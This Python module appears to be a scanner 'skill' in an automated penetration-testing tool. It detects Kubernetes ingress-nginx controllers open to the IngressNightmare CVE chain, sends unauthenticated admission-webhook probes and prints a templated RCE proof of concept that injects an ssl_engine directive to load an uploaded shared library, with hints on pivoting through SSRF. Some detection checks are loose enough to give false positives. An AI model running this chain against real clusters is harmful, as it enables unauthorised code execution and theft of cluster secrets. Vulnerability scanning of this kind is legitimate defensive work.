"""
IngressNightmare — CVE-2025-1974 / CVE-2025-24514 / CVE-2025-1097 / CVE-2025-1098
Skill #62 — IngressNightmareRCE

Research basis:
  Wiz Research — Nir Ohfeld, Ronen Shustin, Sagi Tzadik, Hillai Ben-Sasson
  "IngressNightmare: CVE-2025-1974 — 9.8 Critical RCE in Ingress NGINX"
  https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
  March 24, 2025

Background:

  Ingress NGINX Controller is the most popular Kubernetes ingress controller (18k+ GitHub
  stars, used in 41% of internet-facing clusters). Its architecture places an admission
  controller webhook inside the ingress-nginx pod, responsible for validating incoming
  Ingress objects before deployment.

  The vulnerability chain exploits two key design weaknesses:

  1. The admission controller is UNAUTHENTICATED by default — any pod inside the cluster
     (or any external attacker if the controller is exposed) can send arbitrary
     AdmissionReview requests directly to it.

  2. The controller builds an NGINX configuration from the Ingress object and tests it
     with `nginx -t`. Multiple annotation fields are inserted unsanitized into the config,
     allowing arbitrary NGINX directive injection.

  Injection chain → RCE:

  Step 1: Upload shared library via NGINX client body buffer abuse
    - Send HTTP request to NGINX (port 80/443) with >8KB body (the .so payload)
    - Set Content-Length > actual content → NGINX hangs waiting → FD stays open
    - ProcFS exposes the deleted tmpfile: /proc/<pid>/fd/<n>

  Step 2: Send malicious AdmissionReview to admission controller (port 8443)
    - Inject one of the annotation CVEs:
      * CVE-2025-24514: auth-url annotation — unsanitized URL → nginx config
      * CVE-2025-1097:  auth-tls-match-cn  — CN= bypass → config injection
      * CVE-2025-1098:  mirror UID field   — unfiltered → direct injection
    - Inject: ssl_engine /proc/<ngx_pid>/fd/<n>;
    - OpenSSL ssl_engine directive loads arbitrary shared libraries (undocumented!)
    - Unlike load_module, ssl_engine works anywhere in the config

  Step 3: nginx -t loads the .so → shared library constructor runs → RCE

  Privilege escalation:
    - ingress-nginx ServiceAccount has ClusterRole with access to ALL Secrets
    - RCE on the pod → kubectl get secrets --all-namespaces → cluster takeover

CVEs:
  CVE-2025-24514 — auth-url annotation injection (CVSS 8.8)
  CVE-2025-1097   — auth-tls-match-cn annotation injection (CVSS 8.8)
  CVE-2025-1098   — mirror UID injection (CVSS 8.8)
  CVE-2025-1974   — ssl_engine RCE via nginx -t (CVSS 9.8)

Affected versions:
  ingress-nginx < 1.11.5
  ingress-nginx < 1.12.1
  Note: ingress-nginx reached EOL on November 12, 2025.

AI auto-selection criteria:
  - Target exposes Kubernetes API (port 6443, /api/v1)
  - Admission webhook on port 8443 is accessible
  - NGINX ingress controller headers detected
  - AdmissionReview endpoint responds (with or without auth)
  - SSRF vulnerability found → internal cluster pivot for admission controller access
"""
from __future__ import annotations

import json
import time
import uuid
from dataclasses import dataclass, field
from typing import Any

import httpx


# ── Evidence levels ───────────────────────────────────────────────────────────
VERIFIED    = "VERIFIED"
LIKELY      = "LIKELY"
INFERRED    = "INFERRED"
AI_ANALYSIS = "AI_ANALYSIS"

# ── Detection endpoints ───────────────────────────────────────────────────────
_K8S_API_PATHS = [
    "/api/v1",
    "/apis",
    "/healthz",
    "/readyz",
    "/version",
]

_ADMISSION_PORTS = [8443, 443, 10250]

_INGRESS_NGINX_INDICATORS = [
    "ingress-nginx",
    "ingress_nginx",
    "nginx-ingress",
    "X-Powered-By: NGINX",
    "server: nginx",
]

# Safe AdmissionReview probe — tests if admission controller responds
_ADMISSION_REVIEW_PROBE = {
    "kind": "AdmissionReview",
    "apiVersion": "admission.k8s.io/v1",
    "request": {
        "uid": "",           # filled at runtime
        "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
        "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
        "name": "bingo-probe",
        "namespace": "default",
        "operation": "CREATE",
        "object": {
            "kind": "Ingress",
            "apiVersion": "networking.k8s.io/v1",
            "metadata": {
                "name": "bingo-probe",
                "namespace": "default",
                "annotations": {
                    "nginx.ingress.kubernetes.io/backend-protocol": "HTTP"
                },
            },
            "spec": {
                "ingressClassName": "nginx",
                "rules": [{
                    "host": "probe.example.com",
                    "http": {"paths": [{
                        "path": "/",
                        "pathType": "Prefix",
                        "backend": {"service": {"name": "probe-svc", "port": {"number": 80}}},
                    }]},
                }],
            },
        },
    },
}

# Annotation injection detection payloads (safe — only test NGINX config parsing behavior)
_ANNOTATION_PROBES = [
    {
        "cve": "CVE-2025-24514",
        "name": "auth-url injection",
        "annotation_key": "nginx.ingress.kubernetes.io/auth-url",
        "annotation_value": "http://probe.example.com/test",
        "description": "auth-url annotation unsanitized URL insertion into nginx config",
    },
    {
        "cve": "CVE-2025-1097",
        "name": "auth-tls-match-cn injection",
        "annotation_key": "nginx.ingress.kubernetes.io/auth-tls-match-cn",
        "annotation_value": "CN=probe-test",
        "description": "auth-tls-match-cn CN= prefix bypass for nginx config injection",
        "extra_annotation": {
            "nginx.ingress.kubernetes.io/auth-tls-secret": "kube-system/konnectivity-certs",
        },
    },
    {
        "cve": "CVE-2025-1098",
        "name": "mirror UID injection",
        "annotation_key": "nginx.ingress.kubernetes.io/mirror-uri",
        "annotation_value": "/mirror",
        "description": "mirror UID field unfiltered insertion into nginx config",
    },
]


@dataclass
class IngressFinding:
    finding_type: str
    severity: str
    evidence_level: str
    title: str
    detail: str
    poc_curl: str = ""
    poc_request: str = ""
    poc_response_snippet: str = ""
    remediation: str = ""
    cve: str = ""
    cvss: float = 0.0


@dataclass
class IngressResult:
    target: str = ""
    k8s_detected: bool = False
    k8s_version: str = ""
    admission_controller_exposed: bool = False
    admission_port: int = 0
    admission_url: str = ""
    ingress_nginx_detected: bool = False
    ingress_nginx_version: str = ""
    version_vulnerable: bool = False
    admission_accepts_requests: bool = False
    annotation_injection_surface: list[dict] = field(default_factory=list)
    rce_chain_possible: bool = False
    cluster_secret_access_possible: bool = False
    findings: list[IngressFinding] = field(default_factory=list)
    error: str = ""
    scan_duration_s: float = 0.0
    evidence_summary: dict[str, int] = field(default_factory=dict)


class IngressNightmareScanner:
    """
    Skill #62 — IngressNightmareScanner

    Detects vulnerable Kubernetes Ingress NGINX Controller installations
    and tests for IngressNightmare (CVE-2025-1974 chain):
    - Kubernetes API server detection
    - Ingress NGINX admission controller exposure check
    - Version detection and vulnerable range assessment
    - AdmissionReview endpoint accessibility test (unauthenticated access)
    - Annotation injection surface mapping
    - RCE chain assessment (CVE-2025-1974 ssl_engine + shared library upload)

    AI auto-selection criteria:
      - Target exposes Kubernetes API (port 6443, /api/v1, /apis)
      - Admission webhook port 8443 accessible from target
      - NGINX ingress headers detected
      - SSRF chain + internal cluster access → admission controller pivoting
    """

    TIMEOUT = 12.0
    UA = (
        "Mozilla/5.0 (compatible; kubectl/1.28 "
        "+https://kubernetes.io)"
    )

    def __init__(self, target: str, timeout: float = TIMEOUT):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self._client = httpx.Client(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": self.UA},
        )

    # ── Public API ────────────────────────────────────────────────────────────

    def scan(self) -> IngressResult:
        result = IngressResult(target=self.target)
        t0 = time.perf_counter()
        try:
            self._run(result)
        except Exception as exc:  # noqa: BLE001
            result.error = str(exc)
        finally:
            result.scan_duration_s = round(time.perf_counter() - t0, 2)
            result.evidence_summary = self._count_evidence(result.findings)
        return result

    # ── Internal logic ────────────────────────────────────────────────────────

    def _run(self, result: IngressResult) -> None:
        self._detect_k8s(result)
        self._detect_ingress_nginx(result)
        self._check_admission_controller(result)
        if result.admission_controller_exposed:
            self._test_admission_access(result)
            self._map_injection_surface(result)
        self._assess_rce_chain(result)
        self._generate_findings(result)

    def _detect_k8s(self, result: IngressResult) -> None:
        """Detect Kubernetes API server."""
        k8s_paths = ["/api/v1", "/apis", "/version", "/healthz"]
        for path in k8s_paths:
            try:
                r = self._client.get(f"{self.target}{path}")
                body = r.text[:1000]
                if any(kw in body for kw in (
                    '"kind"', "apiVersion", "kubernetes", "ServerVersion",
                )):
                    result.k8s_detected = True
                    # Extract k8s version
                    import re
                    m = re.search(r'"gitVersion"\s*:\s*"([^"]+)"', body)
                    if m:
                        result.k8s_version = m.group(1)
                    break
            except Exception:
                continue

    def _detect_ingress_nginx(self, result: IngressResult) -> None:
        """Fingerprint Ingress NGINX via response headers and body."""
        probe_paths = ["/", "/healthz", "/metrics", "/nginx-status"]
        for path in probe_paths:
            try:
                r = self._client.get(f"{self.target}{path}")
                hdrs_str = str(r.headers).lower()
                body_lower = r.text[:2000].lower()

                if "ingress-nginx" in hdrs_str or "ingress-nginx" in body_lower:
                    result.ingress_nginx_detected = True

                # NGINX server header
                srv = r.headers.get("server", "").lower()
                if "nginx" in srv:
                    result.ingress_nginx_detected = True

                # Version extraction
                import re
                for pattern in (
                    r"ingress-nginx/(\d+\.\d+\.\d+)",
                    r"nginx/ingress-controller:(\d+\.\d+\.\d+)",
                    r'"version"\s*:\s*"(\d+\.\d+\.\d+)"',
                ):
                    m = re.search(pattern, r.text, re.I)
                    if m:
                        result.ingress_nginx_version = m.group(1)
                        break

                if result.ingress_nginx_detected:
                    break

            except Exception:
                continue

    def _check_admission_controller(self, result: IngressResult) -> None:
        """Check if the admission controller webhook is accessible."""
        import re

        # Parse base host from target URL
        host_part = self.target.split("//", 1)[-1].split("/")[0]
        base_host = re.sub(r":\d+$", "", host_part)
        scheme = "https"  # admission controllers always use TLS

        for port in _ADMISSION_PORTS:
            admission_url = f"{scheme}://{base_host}:{port}"
            try:
                # Try the admission review endpoint directly
                r = httpx.post(
                    f"{admission_url}/networking.k8s.io/v1/ingresses",
                    timeout=5.0,
                    verify=False,
                    headers={
                        "User-Agent": self.UA,
                        "Content-Type": "application/json",
                    },
                    content=b"{}",
                )
                # Admission controller responds with 400 or 200+AdmissionReview
                if r.status_code in (200, 400, 422, 500):
                    body = r.text.lower()
                    if any(kw in body for kw in (
                        "admissionreview", "admission", "ingress", "webhook",
                        "unexpected end", "json", "kind",
                    )):
                        result.admission_controller_exposed = True
                        result.admission_port = port
                        result.admission_url = f"{admission_url}"
                        return

                # Also try the root path for TLS fingerprinting
                r2 = httpx.get(
                    f"{admission_url}/",
                    timeout=4.0,
                    verify=False,
                    headers={"User-Agent": self.UA},
                )
                if r2.status_code in (200, 400, 404):
                    # Admission controllers often return 404 for GET /
                    # but the TLS cert fingerprint can confirm it's ingress-nginx
                    result.admission_controller_exposed = True
                    result.admission_port = port
                    result.admission_url = admission_url
                    return

            except (httpx.ConnectTimeout, httpx.ConnectError):
                continue
            except Exception:
                continue

    def _test_admission_access(self, result: IngressResult) -> None:
        """
        Test if admission controller accepts unauthenticated AdmissionReview requests.
        This is a SAFE probe — only tests response format, no actual injection.
        """
        probe = dict(_ADMISSION_REVIEW_PROBE)
        probe["request"] = dict(probe["request"])
        probe["request"]["uid"] = str(uuid.uuid4())

        try:
            r = httpx.post(
                f"{result.admission_url}/networking.k8s.io/v1/ingresses",
                json=probe,
                timeout=8.0,
                verify=False,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": self.UA,
                },
            )
            body = r.text
            body_lower = body.lower()

            # Successful AdmissionReview response or recognizable error
            if r.status_code in (200, 400, 422) and any(kw in body_lower for kw in (
                "admissionreview", "allowed", "status", "uid",
                "nginx", "ingress",
            )):
                result.admission_accepts_requests = True

        except Exception:
            pass

    def _map_injection_surface(self, result: IngressResult) -> None:
        """Map which annotation injection points are accessible."""
        accessible = []
        for probe in _ANNOTATION_PROBES:
            # Build AdmissionReview with the annotation
            review = dict(_ADMISSION_REVIEW_PROBE)
            review["request"] = dict(review["request"])
            review["request"]["uid"] = str(uuid.uuid4())
            review["request"]["object"] = dict(review["request"]["object"])
            review["request"]["object"]["metadata"] = {
                "name": "bingo-inject-probe",
                "namespace": "default",
                "annotations": {probe["annotation_key"]: probe["annotation_value"]},
            }
            if "extra_annotation" in probe:
                review["request"]["object"]["metadata"]["annotations"].update(
                    probe["extra_annotation"]
                )

            try:
                r = httpx.post(
                    f"{result.admission_url}/networking.k8s.io/v1/ingresses",
                    json=review,
                    timeout=8.0,
                    verify=False,
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": self.UA,
                    },
                )
                # If admission controller processes the request (not rejected at TLS/auth)
                if r.status_code in (200, 400, 422, 500):
                    accessible.append({
                        "cve": probe["cve"],
                        "name": probe["name"],
                        "annotation_key": probe["annotation_key"],
                        "status_code": r.status_code,
                        "evidence_level": VERIFIED if r.status_code == 200 else LIKELY,
                    })
            except Exception:
                continue

        result.annotation_injection_surface = accessible

    def _assess_rce_chain(self, result: IngressResult) -> None:
        """Assess RCE chain feasibility based on gathered evidence."""
        # Full RCE chain requires:
        # 1. Admission controller accessible
        # 2. Ingress-nginx version vulnerable
        # 3. Annotation injection surface accessible
        if result.admission_accepts_requests and (
            result.annotation_injection_surface or result.ingress_nginx_detected
        ):
            result.rce_chain_possible = True
            result.cluster_secret_access_possible = True

        # Vulnerable version check
        if result.ingress_nginx_version:
            try:
                parts = result.ingress_nginx_version.split(".")
                major, minor, patch = int(parts[0]), int(parts[1]), int(parts[2])
                result.version_vulnerable = (
                    (major == 1 and minor <= 10) or
                    (major == 1 and minor == 11 and patch < 5) or
                    (major == 1 and minor == 12 and patch < 1)
                )
            except (ValueError, IndexError):
                pass

    # ── Finding generation ────────────────────────────────────────────────────

    def _generate_findings(self, result: IngressResult) -> None:
        # K8s cluster detection
        if result.k8s_detected:
            result.findings.append(IngressFinding(
                finding_type="k8s_detected",
                severity="INFO",
                evidence_level=VERIFIED,
                title=f"Kubernetes Cluster Detected"
                      + (f" ({result.k8s_version})" if result.k8s_version else ""),
                detail=f"Target {self.target} exposes Kubernetes API server.",
                poc_curl=f"curl -sk '{self.target}/api/v1' | python3 -m json.tool | head -20",
            ))

        # Ingress NGINX detection
        if result.ingress_nginx_detected:
            result.findings.append(IngressFinding(
                finding_type="ingress_nginx_detected",
                severity="INFO",
                evidence_level=VERIFIED,
                title="Ingress NGINX Controller Detected"
                      + (f" v{result.ingress_nginx_version}" if result.ingress_nginx_version else ""),
                detail=(
                    f"Ingress NGINX Controller identified. "
                    + (f"Version {result.ingress_nginx_version}." if result.ingress_nginx_version
                       else "Version unknown.")
                ),
                remediation="Ensure ingress-nginx ≥ 1.11.5 or ≥ 1.12.1. Note: EOL Nov 2025.",
            ))

        # Vulnerable version
        if result.version_vulnerable:
            result.findings.append(IngressFinding(
                finding_type="vulnerable_version",
                severity="HIGH",
                evidence_level=VERIFIED,
                title=f"Vulnerable ingress-nginx Version: {result.ingress_nginx_version} — IngressNightmare",
                detail=(
                    f"ingress-nginx {result.ingress_nginx_version} is vulnerable to CVE-2025-1974 "
                    f"(CVSS 9.8). Patched in 1.11.5+ and 1.12.1+."
                ),
                cve="CVE-2025-1974",
                cvss=9.8,
                remediation="Upgrade ingress-nginx to 1.11.5+ (1.11.x) or 1.12.1+ (1.12.x).",
            ))

        # Exposed admission controller
        if result.admission_controller_exposed:
            result.findings.append(IngressFinding(
                finding_type="admission_controller_exposed",
                severity="CRITICAL",
                evidence_level=VERIFIED,
                title=f"Ingress NGINX Admission Controller Exposed — Port {result.admission_port}",
                detail=(
                    f"The Ingress NGINX admission controller webhook is accessible at "
                    f"{result.admission_url}. By default it requires NO authentication. "
                    f"Over 6,500 clusters publicly expose this endpoint."
                ),
                poc_curl=(
                    f"curl -sk '{result.admission_url}/networking.k8s.io/v1/ingresses' "
                    f"-X POST -H 'Content-Type: application/json' -d '{{\"kind\":\"AdmissionReview\"}}'"
                ),
                remediation=(
                    "Restrict admission controller access: "
                    "only Kubernetes API Server should reach port 8443. "
                    "Apply strict NetworkPolicies."
                ),
                cve="CVE-2025-1974",
                cvss=9.8,
            ))

        # Unauthenticated access confirmed
        if result.admission_accepts_requests:
            result.findings.append(IngressFinding(
                finding_type="unauthenticated_admission",
                severity="CRITICAL",
                evidence_level=VERIFIED,
                title="Admission Controller Accepts Unauthenticated AdmissionReview Requests",
                detail=(
                    "The admission controller processed an unauthenticated AdmissionReview "
                    "request. Any attacker with network access can send arbitrary Ingress "
                    "objects to this endpoint."
                ),
                poc_curl=(
                    f"curl -sk '{result.admission_url}/networking.k8s.io/v1/ingresses' "
                    f"-X POST -H 'Content-Type: application/json' "
                    f"-d @admission_review.json"
                ),
                cve="CVE-2025-1974",
                cvss=9.8,
            ))

        # Annotation injection surface
        for inj in result.annotation_injection_surface:
            result.findings.append(IngressFinding(
                finding_type="annotation_injection",
                severity="CRITICAL",
                evidence_level=inj.get("evidence_level", LIKELY),
                title=f"{inj['cve']} Annotation Injection Surface — {inj['name']}",
                detail=(
                    f"The {inj['annotation_key']} annotation is processed by the admission "
                    f"controller and inserted into NGINX configuration without sufficient "
                    f"sanitization. This enables arbitrary NGINX directive injection."
                ),
                poc_curl=(
                    f"# {inj['cve']} — {inj['name']}\n"
                    f"# Annotation: {inj['annotation_key']}\n"
                    f"# Combine with ssl_engine directive to load shared library → RCE"
                ),
                cve=inj["cve"],
                cvss=8.8,
                remediation="Upgrade ingress-nginx to 1.11.5+ or 1.12.1+.",
            ))

        # Full RCE chain
        if result.rce_chain_possible:
            exploit_steps = (
                "# IngressNightmare Full RCE Chain\n"
                "# Step 1: Upload shared library via client body buffer\n"
                f"curl -sk '{self.target}/' "
                "-X POST -H 'Content-Length: 9999999' --data-binary @payload.so &\n"
                "# (find FD: /proc/<nginx_pid>/fd/<n>)\n\n"
                "# Step 2: Send malicious AdmissionReview (ssl_engine injection)\n"
                f"curl -sk '{result.admission_url}/networking.k8s.io/v1/ingresses' "
                "-X POST -H 'Content-Type: application/json' -d '{\"request\":{\"annotations\":"
                "{\"nginx.ingress.kubernetes.io/auth-url\":"
                "\"http://x/#;\\nssl_engine /proc/<pid>/fd/<n>;\"}}}'"
            )
            result.findings.append(IngressFinding(
                finding_type="rce_chain",
                severity="CRITICAL",
                evidence_level=LIKELY,
                title=(
                    "IngressNightmare Full RCE Chain — "
                    "Client Body Upload + ssl_engine Injection + Cluster Secret Takeover"
                ),
                detail=(
                    "Full exploit chain assessed as achievable:\n"
                    "1. Upload .so payload via NGINX client body buffer (>8KB)\n"
                    "2. ProcFS FD access: /proc/<nginx_pid>/fd/<n>\n"
                    "3. AdmissionReview with ssl_engine directive injection\n"
                    "4. nginx -t loads .so → RCE on ingress-nginx pod\n"
                    "5. ClusterRole with all-namespaces secret access → cluster takeover\n"
                    "SSRF pairing: combine with SSRF vulns to access admission controller "
                    "from external position."
                ),
                poc_curl=exploit_steps,
                cve="CVE-2025-1974",
                cvss=9.8,
                remediation=(
                    "CRITICAL: Upgrade ingress-nginx to 1.11.5+ or 1.12.1+.\n"
                    "1. kubectl set image deployment/ingress-nginx-controller controller=...\n"
                    "2. Apply NetworkPolicy: only allow kube-apiserver → admission port 8443\n"
                    "3. Disable admission webhook if upgrade impossible:\n"
                    "   helm upgrade ingress-nginx ... --set controller.admissionWebhooks.enabled=false\n"
                    "4. Plan migration to Kubernetes Gateway API (ingress-nginx EOL Nov 2025)"
                ),
            ))

    @staticmethod
    def _count_evidence(findings: list[IngressFinding]) -> dict[str, int]:
        counts: dict[str, int] = {}
        for f in findings:
            counts[f.evidence_level] = counts.get(f.evidence_level, 0) + 1
        return counts

    def close(self) -> None:
        self._client.close()

    def __enter__(self) -> "IngressNightmareScanner":
        return self

    def __exit__(self, *_: Any) -> None:
        self.close()
